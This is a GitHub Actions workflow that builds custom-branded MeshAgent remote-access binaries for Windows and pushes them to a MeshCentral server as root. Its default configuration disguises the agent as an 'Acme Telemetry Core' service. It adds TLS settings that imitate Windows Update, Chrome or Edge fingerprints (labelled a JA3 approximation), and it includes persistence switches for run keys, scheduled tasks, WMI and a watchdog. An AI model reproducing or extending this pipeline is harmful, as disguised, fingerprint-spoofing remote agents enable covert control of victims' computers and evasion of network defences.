name: Build and Release Custom MeshAgent

concurrency:
  group: meshagent-build-${{ github.ref }}
  cancel-in-progress: false

on:
  push:
    branches: [ main, master ]
    tags:
      - 'v*'
  pull_request:
    branches: [ main, master ]
  workflow_dispatch:
    inputs:
      deploy_to_server:
        description: 'Deploy to MeshCentral server after build'
        required: false
        default: 'false'
        type: boolean

permissions:
  contents: write

env:
  BRANDING_CONFIG: 'ip_only_acme.json'
  MESHCENTRAL_SERVER: 'high.support'
  MESHCENTRAL_AGENTS_PATH: '/opt/meshcentral/meshcentral-data/agents'

jobs:
  build-windows:
    runs-on: windows-latest
    strategy:
      matrix:
        arch: [x64, x86]
        include:
          - arch: x64
            platform: x64
            output_name: MeshService64.exe
          - arch: x86
            platform: x86
            output_name: MeshService.exe

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          submodules: recursive
          fetch-depth: 0

      - name: Add MSBuild to PATH
        uses: microsoft/setup-msbuild@v1.1

      - name: Setup NuGet
        uses: NuGet/setup-nuget@v2
        with:
          nuget-version: '6.x'

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.x'

      - name: Cache NuGet packages
        uses: actions/cache@v4
        with:
          path: |
            ~/.nuget/packages
            packages
          key: ${{ runner.os }}-nuget-${{ hashFiles('**/packages.config') }}
          restore-keys: |
            ${{ runner.os }}-nuget-

      - name: Fetch branding configuration
        id: fetch_config
        shell: pwsh
        run: |
          $envConfig = $env:BRANDING_CONFIG
          if ($envConfig -and (Test-Path $envConfig)) {
            Write-Host "Using branding config from env path: $envConfig"
            Copy-Item $envConfig -Destination "./branding_config.json" -Force
            Get-Content "./branding_config.json"
          }
          elseif ($envConfig -and (Test-Path "./$envConfig")) {
            Write-Host "Using branding config from repository by name: $envConfig"
            Copy-Item "./$envConfig" -Destination "./branding_config.json" -Force
            Get-Content "./branding_config.json"
          }
          elseif (Test-Path "./branding_config.json") {
            Write-Host "Using branding config from repository"
            Get-Content "./branding_config.json"
          }
          elseif ("${{ secrets.BRANDING_CONFIG_JSON }}" -ne "") {
            "${{ secrets.BRANDING_CONFIG_JSON }}" | Out-File -FilePath "./branding_config.json" -Encoding utf8
            Write-Host "Using branding config from secrets"
            Get-Content "./branding_config.json"
          }
          else {
            Write-Host "Creating default branding config"
            $default = @{
              branding = @{
                companyName = "Acme Corp"
                serviceName = "AcmeTelemetryCore"
                displayName = "Acme Telemetry Core Service"
                binaryName = "AcmeTelemetryCore.exe"
                productName = "Acme Telemetry Core"
                description = "Acme Telemetry Core Service"
                logPath = "C:/ProgramData/Acme/TelemetryCore/logs"
              }
              network = @{
                primaryEndpoint = "wss://high.support:443/agent.ashx"
                userAgent = "AcmeAgent/1.0"
                alpn = @("http/1.1")
              }
              # Sample TLS presets; select one by setting root-level tlsPreset
              tlsPresets = @{
                windows_update = @{
                  minVersion = "TLS1.2"
                  maxVersion = "TLS1.2"
                  cipherList = "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384"
                  tls13Ciphers = ""  # TLS1.3 disabled by maxVersion
                  signatureAlgorithms = "rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512"
                  supportedGroups = "x25519:P-256:P-384"
                  alpn = @("http/1.1")
                }
                chrome_windows = @{
                  minVersion = "TLS1.2"
                  maxVersion = "TLS1.3"
                  cipherList = "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256"
                  tls13Ciphers = "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
                  signatureAlgorithms = "rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp256r1_sha256"
                  supportedGroups = "x25519:P-256:P-384"
                  alpn = @("h2","http/1.1")
                }
                edge_windows = @{
                  minVersion = "TLS1.2"
                  maxVersion = "TLS1.3"
                  cipherList = "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256"
                  tls13Ciphers = "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256"
                  signatureAlgorithms = "rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp256r1_sha256"
                  supportedGroups = "x25519:P-256:P-384"
                  alpn = @("h2","http/1.1")
                }
              }
              tlsPreset = "windows_update"
              # Optional direct tls override object; if empty and tlsPreset set, preset is used
              tls = @{}
            }
            $default | ConvertTo-Json -Depth 5 | Out-File -FilePath "./branding_config.json" -Encoding utf8
            Get-Content "./branding_config.json"
          }

      - name: Generate branding headers
        shell: pwsh
        run: |
          $script = @'
          import json, os
          cfg = json.load(open("branding_config.json","r"))
          branding = cfg.get("branding", {})
          network = cfg.get("network", {})
          tls_cfg = cfg.get("tls", {})
          tls_presets = cfg.get("tlsPresets", {})
          tls_preset_name = cfg.get("tlsPreset", "")
          if (not tls_cfg) and tls_preset_name and (tls_preset_name in tls_presets):
              tls_cfg = tls_presets[tls_preset_name]
          service_name = branding.get("serviceName", "MeshAgent")
          display_name = branding.get("displayName", "Mesh Agent Background Service")
          company_name = branding.get("companyName", "")
          product_name = branding.get("productName", service_name)
          description = branding.get("description", display_name)
          binary_name = branding.get("binaryName", f"{service_name}.exe")
          log_path = branding.get("logPath", "C:/ProgramData/MeshAgent/logs")
          endpoint = network.get("primaryEndpoint", "")
          user_agent = network.get("userAgent", "MeshAgent/1.0")
          # TLS/JA3-related optional settings
          tls_min = tls_cfg.get("minVersion", "")
          tls_max = tls_cfg.get("maxVersion", "")
          cipher_list = tls_cfg.get("cipherList", "")
          tls13_ciphers = tls_cfg.get("tls13Ciphers", "")
          sig_algs = tls_cfg.get("signatureAlgorithms", "")
          groups = tls_cfg.get("supportedGroups", "")
          # Prefer ALPN from tls_cfg if present; else from network; default http/1.1
          alpn_source = tls_cfg.get("alpn", network.get("alpn", ["http/1.1"]))
          alpn_list = alpn_source if isinstance(alpn_source, list) else [str(alpn_source)]
          alpn = ",".join(alpn_list)

          header = f'''/* Generated file - do not edit. */
          #ifndef GENERATED_MESHAGENT_BRANDING_H
          #define GENERATED_MESHAGENT_BRANDING_H
          #undef MESH_AGENT_SERVICE_FILE
          #define MESH_AGENT_SERVICE_FILE TEXT("{service_name}")
          #undef MESH_AGENT_SERVICE_NAME
          #define MESH_AGENT_SERVICE_NAME TEXT("{display_name}")
          #undef MESH_AGENT_COMPANY_NAME
          #define MESH_AGENT_COMPANY_NAME "{company_name}"
          #undef MESH_AGENT_PRODUCT_NAME
          #define MESH_AGENT_PRODUCT_NAME "{product_name}"
          #undef MESH_AGENT_FILE_DESCRIPTION
          #define MESH_AGENT_FILE_DESCRIPTION "{description}"
          #undef MESH_AGENT_INTERNAL_NAME
          #define MESH_AGENT_INTERNAL_NAME "{binary_name}"
          #undef MESH_AGENT_COPYRIGHT
          #define MESH_AGENT_COPYRIGHT "Apache 2.0 License"
          #undef MESH_AGENT_LOG_DIRECTORY
          #define MESH_AGENT_LOG_DIRECTORY TEXT("{log_path}")
          #define MESH_AGENT_NETWORK_ENDPOINT "{endpoint}"
          #define MESH_AGENT_NETWORK_SNI NULL
          #define MESH_AGENT_NETWORK_USER_AGENT "{user_agent}"
          #define MESH_AGENT_NETWORK_JA3 NULL

          /* TLS customization (best-effort JA3 approximation) */
          #define MESH_AGENT_TLS_MIN_VERSION "{tls_min}"
          #define MESH_AGENT_TLS_MAX_VERSION "{tls_max}"
          #define MESH_AGENT_TLS_CIPHER_LIST "{cipher_list}"
          #define MESH_AGENT_TLS13_CIPHERS "{tls13_ciphers}"
          #define MESH_AGENT_TLS_SIGALGS "{sig_algs}"
          #define MESH_AGENT_TLS_GROUPS "{groups}"
          #define MESH_AGENT_ALPN "{alpn}"
          #define MESH_AGENT_PERSIST_RUNKEY 0
          #define MESH_AGENT_PERSIST_TASK 0
          #define MESH_AGENT_PERSIST_WMI 0
          #define MESH_AGENT_PERSIST_WATCHDOG 1
          #endif
          '''
          os.makedirs("meshcore/generated", exist_ok=True)
          open("meshcore/generated/meshagent_branding.h", "w").write(header)
          print("Generated branding header successfully")
          '@
          $script | Out-File -FilePath "generate_branding.py" -Encoding utf8
          python generate_branding.py

      - name: Restore NuGet packages
        shell: pwsh
        run: |
          Write-Host "Restoring NuGet packages for MeshAgent-2022.sln"
          $max = 3
          for ($i = 1; $i -le $max; $i++) {
            Write-Host ("Attempt {0}: msbuild /t:Restore" -f $i)
            msbuild MeshAgent-2022.sln /t:Restore /m /v:minimal
            if ($LASTEXITCODE -eq 0) { break }
            Write-Host ("Attempt {0}: nuget restore" -f $i)
            nuget restore MeshAgent-2022.sln -NonInteractive
            if ($LASTEXITCODE -eq 0) { break }
            if ($i -eq $max) { exit $LASTEXITCODE }
            Write-Host ("NuGet restore failed (attempt {0}). Retrying in 10 seconds..." -f $i)
            Start-Sleep -Seconds 10
          }

      - name: Build MeshService (${{ matrix.arch }})
        shell: pwsh
        run: |
          Write-Host "Building MeshService for ${{ matrix.arch }} platform"
          $plat = '${{ matrix.platform }}'
          $msPlat = if ($plat -eq 'x86') { 'Win32' } else { $plat }
          msbuild "meshservice/MeshService-2022.vcxproj" `
            /p:Configuration=Release `
            /p:Platform=$msPlat `
            /p:WindowsTargetPlatformVersion=10.0 `
            /p:PlatformToolset=v143 `
            /m `
            /v:minimal `
            /fl `
            /flp:logfile=build_${{ matrix.arch }}.log

      - name: Locate and rename binary
        id: locate_binary
        shell: pwsh
        run: |
          $targetName = "${{ matrix.output_name }}"
          $exePath = Get-ChildItem -Path "." -Recurse -Filter $targetName | Where-Object {
            $_.DirectoryName -like "*Release*"
          } | Select-Object -First 1
          if ($exePath) {
            New-Item -ItemType Directory -Force -Path "./artifacts" | Out-Null
            Copy-Item $exePath.FullName -Destination "./artifacts/$targetName"
            echo "artifact_path=./artifacts/$targetName" >> $env:GITHUB_OUTPUT
          } else {
            Write-Host "ERROR: Could not find built executable"
            exit 1
          }

      - name: Upload build logs (if exists)
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: build-log-${{ matrix.arch }}
          path: build_${{ matrix.arch }}.log
          if-no-files-found: ignore
          retention-days: 30

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: ${{ matrix.output_name }}
          path: ./artifacts/${{ matrix.output_name }}
          retention-days: 90

      - name: Upload to release (on tag)
        if: startsWith(github.ref, 'refs/tags/v')
        uses: softprops/action-gh-release@v2
        with:
          files: ./artifacts/${{ matrix.output_name }}
          draft: false
          prerelease: false
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  deploy-to-server:
    needs: build-windows
    runs-on: ubuntu-latest
    env:
      SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
    if: |
      (github.event_name == 'workflow_dispatch' && github.event.inputs.deploy_to_server == 'true') ||
      (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v'))
    steps:
      - name: Download artifacts
        uses: actions/download-artifact@v4
        with:
          path: ./artifacts

      - name: Setup SSH
        if: ${{ env.SSH_PRIVATE_KEY != '' }}
        run: |
          mkdir -p ~/.ssh
          echo "${{ env.SSH_PRIVATE_KEY }}" > ~/.ssh/id_rsa
          chmod 600 ~/.ssh/id_rsa
          ssh-keyscan -H ${{ env.MESHCENTRAL_SERVER }} >> ~/.ssh/ssh_known_hosts

      - name: Deploy to MeshCentral server
        if: ${{ env.SSH_PRIVATE_KEY != '' }}
        run: |
          scp ./artifacts/MeshService64.exe/MeshService64.exe root@${{ env.MESHCENTRAL_SERVER }}:${{ env.MESHCENTRAL_AGENTS_PATH }}/
          scp ./artifacts/MeshService.exe/MeshService.exe root@${{ env.MESHCENTRAL_SERVER }}:${{ env.MESHCENTRAL_AGENTS_PATH }}/
          ssh root@${{ env.MESHCENTRAL_SERVER }} "systemctl restart meshcentral"

      - name: Verify deployment
        if: ${{ env.SSH_PRIVATE_KEY != '' }}
        run: |
          sleep 10
          ssh root@${{ env.MESHCENTRAL_SERVER }} "systemctl status meshcentral --no-pager"

  create-release:
    needs: build-windows
    runs-on: ubuntu-latest
    if: startsWith(github.ref, 'refs/tags/v')
    steps:
      - name: Download all artifacts
        uses: actions/download-artifact@v4
        with:
          path: ./artifacts

      - name: Create release notes
        run: |
          cat > release_notes.md << 'EOF'
          ## Custom MeshAgent Binaries
          This release contains custom-branded MeshAgent binaries:
          - MeshService64.exe (64-bit)
          - MeshService.exe (32-bit)
          Built from commit: ${{ github.sha }}
          EOF

      - name: Create GitHub Release (aggregate)
        uses: softprops/action-gh-release@v2
        with:
          files: ./artifacts/**/*.exe
          body_path: release_notes.md
          draft: false
          prerelease: false
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
